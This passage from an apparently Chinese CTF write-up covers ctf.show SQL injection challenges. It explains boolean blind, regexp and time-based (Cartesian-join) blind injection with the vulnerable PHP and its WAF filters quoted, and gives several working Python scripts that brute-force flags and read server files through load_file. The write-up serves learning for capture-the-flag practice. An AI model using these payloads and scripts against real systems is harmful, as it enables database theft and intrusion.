class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#@Author:quan9i</span>\n<span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://f9eb9d85-b9e7-4719-8ab3-a1aecfd29198.challenge.ctf.show/api/\"</span>\nflag<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">55</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token string\">\"0123456789abcdefghijklmnopqrstuvwxyz_-&#123;&#125;\"</span><span class=\"token punctuation\">:</span>\n            <span class=\"token comment\">#查数据库</span>\n            <span class=\"token comment\"># payload=\"-1' or if(substr((select database()),&#123;&#125;,1)='&#123;&#125;',1,0)#\".format(i,j)</span>\n            <span class=\"token comment\">#查表</span>\n            <span class=\"token comment\"># payload=\"-1' or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',1,0)#\".format(i,j)</span>\n            <span class=\"token comment\">#查列</span>\n            <span class=\"token comment\"># payload=\"-1' or if(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),&#123;&#125;,1)='&#123;&#125;',1,0)#\".format(i,j)</span>\n            <span class=\"token comment\">#查字段</span>\n            payload<span class=\"token operator\">=</span><span class=\"token string\">\"-1' or if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)='&#123;&#125;',1,0)#\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#print(payload)</span>\n            data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span>payload<span class=\"token punctuation\">,</span>\n                <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span>\n            <span class=\"token punctuation\">&#125;</span>\n            r<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token string\">\"\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n                flag <span class=\"token operator\">+=</span> j\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> j<span class=\"token operator\">==</span><span class=\"token string\">'&#125;'</span><span class=\"token punctuation\">:</span>\n                    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">break</span>\n        <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"0X02-1\"><a href=\"#0X02-1\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">  <span class=\"token operator\">//</span>拼接sql语句查找指定ID用户\n  $sql <span class=\"token operator\">=</span> <span class=\"token string\">\"select pass from ctfshow_user where username = &#123;$username&#125;\"</span><span class=\"token punctuation\">;</span>\n      \n\n返回逻辑\n  <span class=\"token operator\">//</span>用户名检测\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/select|and| |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleep|benchmark/i'</span><span class=\"token punctuation\">,</span> $username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">'用户名非法'</span><span class=\"token punctuation\">;</span>\n    die<span class=\"token punctuation\">(</span>json_encode<span class=\"token punctuation\">(</span>$ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token operator\">//</span>密码检测\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>!is_numeric<span class=\"token punctuation\">(</span>$password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">'密码只能为数字'</span><span class=\"token punctuation\">;</span>\n    die<span class=\"token punctuation\">(</span>json_encode<span class=\"token punctuation\">(</span>$ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token operator\">//</span>密码判断\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$row<span class=\"token punctuation\">[</span><span class=\"token string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>$password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n      $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">'登陆成功'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>看密码判断，<code>$row[&#39;pass&#39;]</code>可以理解为返回查询的结果，在和后面的password进行弱比较，这里我需要简单介绍一下<code>intval</code>函数</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">intval<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>:当里面内容为数字时候，输出的是数字\n\t\t 当内容为字母时，输出的是<span class=\"token number\">0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时我们构造username=<code>0</code>，因为username中都是字符串，其数字值也是0，所以返回了所有以字母开头的数据，同理如果pass中的数据也都是字母开头，此时我们再让password等于0，条件就可以成功执行，flag也会回显出来。<br>这里我们尝试0/0进行登录<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539830.png\" alt=\"在这里插入图片描述\"><br>提示密码错误，说明存在全字母的username，但password不是全字母。<br>此时查看响应<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539107.png\" alt=\"在这里插入图片描述\"><br>尝试1/0登录<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539149.png\" alt=\"在这里插入图片描述\"><br>提示查询失败，说明不存在username为1的用户，此时查看响应<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539391.png\" alt=\"在这里插入图片描述\"><br>综合来看，说明当username正确执行时，会出现<code>\\u5bc6\\u7801\\u9519\\u8bef</code>字段，<br>由题目提示可知文件路径在<code>/var/www/html/api/index.php</code>下，因此我们可以利用<code>load_file</code>函数来获取内容，在这里对load_file简单介绍一下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">load_file<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>将括号内的文件内容进行读取，并以字符串形式返回<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>用if语句将文件内容读取并进行正则匹配，正确执行时输出0，否则为1。此时username如果执行正确就可以查到数据，脚本如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#@Author:quan9i</span>\n<span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://044bf66a-c828-4484-8281-4668e93c34ea.challenge.ctf.show/api/index.php\"</span>\nflag<span class=\"token operator\">=</span><span class=\"token string\">\"ctfshow&#123;\"</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">127</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token string\">'?'</span><span class=\"token keyword\">and</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            payload<span class=\"token operator\">=</span><span class=\"token string\">\"if((load_file('/var/www/html/api/index.php'))regexp('&#123;&#125;'),0,1)\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>flag<span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span>payload<span class=\"token punctuation\">,</span>\n                <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span> <span class=\"token comment\">#这里可以随便输入，这种方式获取flag不需要看password</span>\n            <span class=\"token punctuation\">&#125;</span>\n            r<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token string\">\"\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n                flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token string\">'&#125;'</span><span class=\"token punctuation\">:</span>\n                    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">break</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"成功绕过元字符\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539387.png\" alt=\"在这里插入图片描述\"><br><font color='red'>注:这里j不能取<code>+</code> <code>?</code> <code>.</code> 是因为这三个属于正则表达式中的元字符，会污染正则匹配，还有ascii码的(0,32)及127是控制字符，也会影响脚本</font></p>\n<h3 id=\"0X03（布尔盲注正则版）\"><a href=\"#0X03（布尔盲注正则版）\" class=\"headerlink\" title=\"0X03（布尔盲注正则版）\"></a>0X03（布尔盲注正则版）</h3><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">//拼接sql语句查找指定ID用户</span>\n  $<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"select count(pass) from \"</span><span class=\"token punctuation\">.</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'tableName'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token string\">\";\"</span><span class=\"token punctuation\">;</span>\n      \n返回逻辑\n<span class=\"token comment\">//对传入的参数进行了过滤</span>\n  <span class=\"token keyword\">function</span> waf<span class=\"token punctuation\">(</span>$str<span class=\"token punctuation\">)</span>&#123;\n    <span class=\"token keyword\">return</span> preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i'</span><span class=\"token punctuation\">,</span> $str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  &#125;\n\n查询结果\n\n<span class=\"token comment\">//返回用户表的记录总数</span>\n      $user_count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看出注入方式改为post注入，我们查看sql语句可以发现我们只需要以post方式传入表名即可正确执行sql语句，简单测试一下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">tableName<span class=\"token operator\">=</span>ctfshow_user<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539616.png\" alt=\"在这里插入图片描述\">发现可以执行，此时我们可以利用where进行模糊匹配，从而得到我们想要的flag<br>payload</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">tableName<span class=\"token operator\">=</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>ctfshow_user<span class=\"token punctuation\">`</span></span><span class=\"token keyword\">where</span><span class=\"token punctuation\">(</span>substr<span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">regexp</span><span class=\"token punctuation\">(</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>执行的实际语句</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span>pass<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"tableName=`ctfshow_user`where(substr(`pass`,1,1)regexp('c'))\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>涉及知识</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">substr<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">)</span>\nx是字符串那部分，我们在这里可以理解为列名\ny指的是从y开始，例如当y<span class=\"token operator\">=</span><span class=\"token number\">1</span>是就从第一个字母开始\nz指的是截取几位，例如当z<span class=\"token operator\">=</span><span class=\"token number\">1</span>时就代表截取<span class=\"token number\">1</span>位\n\n<span class=\"token operator\">regexp</span>模糊匹配\n在这里表示的是将结果<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>本地测试一下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> substr<span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">regexp</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539610.png\" alt=\"在这里插入图片描述\">可见其可以把username列中首字母为a的全部取出来</p>\n<p>你可以把第一个1依次后推，在bp中，设置c为变量进行爆破，可以依次得到flag<br>不过这样速度较慢，搞一下脚本</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">import</span> requests\nurl<span class=\"token operator\">=</span><span class=\"token string\">'http://6b306aef-1841-4432-8af3-599dd5db1815.challenge.ctf.show/select-waf.php'</span>\nflagstr<span class=\"token operator\">=</span>r<span class=\"token string\">\"1234567890qwertyuiopasdfghjklzxcvbnm-_&#125;&#123;\"</span>\nflag<span class=\"token operator\">=</span><span class=\"token string\">'ctfhsow'</span> <span class=\"token comment\">//设置flag格式，再进行匹配更精确</span>\n<span class=\"token keyword\">for</span> i <span class=\"token operator\">in</span> range<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span>: <span class=\"token comment\">//ctfshow已经7位，故从第八位开始</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token operator\">in</span> flagstr:\n        <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> &#123;\n            <span class=\"token string\">'tableName'</span>: <span class=\"token string\">\"(ctfshow_user)where(substr(pass,&#123;&#125;,1))regexp('&#123;&#125;')\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span> <span class=\"token comment\">//第一次的时候就是在全部列的pass下第八位中依次寻找j的，最终取出来，这里取出&#123;</span>\n        &#125;\n        exp <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token keyword\">data</span><span class=\"token operator\">=</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"$user_count = 1;\"</span> <span class=\"token operator\">in</span> exp<span class=\"token punctuation\">.</span><span class=\"token keyword\">text</span>:\n            flag <span class=\"token operator\">+</span><span class=\"token operator\">=</span> j\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"时间盲注-1\"><a href=\"#时间盲注-1\" class=\"headerlink\" title=\"时间盲注\"></a>时间盲注</h2><h3 id=\"0X01-时间盲注笛卡尔积版\"><a href=\"#0X01-时间盲注笛卡尔积版\" class=\"headerlink\" title=\"0X01(时间盲注笛卡尔积版)\"></a>0X01(时间盲注笛卡尔积版)</h3><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">function</span> waf<span class=\"token punctuation\">(</span>$str<span class=\"token punctuation\">)</span>&#123;\n       <span class=\"token keyword\">return</span> preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/sleep|benchmark/i'</span><span class=\"token punctuation\">,</span>$str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   &#125;   <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>过滤这两个函数，有一种东西叫笛卡尔积，简单介绍一下<br><code>笛卡尔积，又叫cross join，是SQL中两表连接的一种方式。通常我们都要在实际SQL中避免直接使用笛卡尔积，因为它会使“数据爆炸”，尤其是数据量很大的时候。</code>本地测试如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> A<span class=\"token punctuation\">,</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> B<span class=\"token punctuation\">,</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> D<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539149.png\" alt=\"在这里插入图片描述\">由此可见可以代替被ban的函数，因此我们可以构造payload如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>，<span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> A<span class=\"token punctuation\">,</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> B<span class=\"token punctuation\">,</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> C<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>但由于手动较慢，因此选用脚本，脚本如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#@Author:quan9i</span>\n<span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://d0565861-1643-4f0f-8ef3-10c53ce54e13.challenge.ctf.show/api/\"</span>\nflag<span class=\"token operator\">=</span><span class=\"token string\">\"ctfshow&#123;\"</span>\n<span class=\"token keyword\">for</span> i <span class=\"token operator\">in</span> range<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">55</span><span class=\"token punctuation\">)</span>:\n    <span class=\"token keyword\">for</span> j <span class=\"token operator\">in</span> <span class=\"token string\">\"0123456789ab,cdefghijklmnopqrstuvwxyz_-&#123;&#125;\"</span>:\n            <span class=\"token comment\">#查表</span>\n            <span class=\"token comment\">#payload=\"if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1)='&#123;&#125;',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)\"</span>\n            <span class=\"token comment\">#查字段</span>\n            payload<span class=\"token operator\">=</span><span class=\"token string\">\"if(substr((select flagaac from ctfshow_flagxc),&#123;&#125;,1)='&#123;&#125;',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables D),1)\"</span>\n            <span class=\"token comment\">#print(payload)</span>\n            <span class=\"token keyword\">data</span><span class=\"token operator\">=</span>&#123;\n                <span class=\"token string\">'ip'</span>:payload<span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">'debug'</span>:<span class=\"token string\">'0'</span>\n            &#125;\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span>\n            try:\n                response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span><span class=\"token keyword\">data</span><span class=\"token operator\">=</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">0.7</span><span class=\"token punctuation\">)</span>\n                <span class=\"token comment\">#print(\"执行失败\")</span>\n            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e:\n                <span class=\"token comment\">#print(\"执行成功\")</span>\n                flag <span class=\"token operator\">+</span><span class=\"token operator\">=</span> j\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>  \n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"0X02-2\"><a href=\"#0X02-2\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">//分页查询</span>\n$<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> ctfshow_user <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> $username<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>看起来是group by注入，在查询了有关group by注入后发现，大部分都是group by报错注入，这位师傅的文章写的还是很不错的<a href=\"https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html\">https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html</a>，当我p颠p颠的去注入报错注入的payload</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">concat<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>floor<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>发现没反应，此时才想到压根就没回显，又怎么可能有报错信息，因此我们这里只能用时间盲注来进行获取flag，示例payload如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">concat<span class=\"token punctuation\">(</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>&#123;<span class=\"token number\">1</span>&#125;<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">'&#123;c&#125;'</span><span class=\"token punctuation\">,</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" 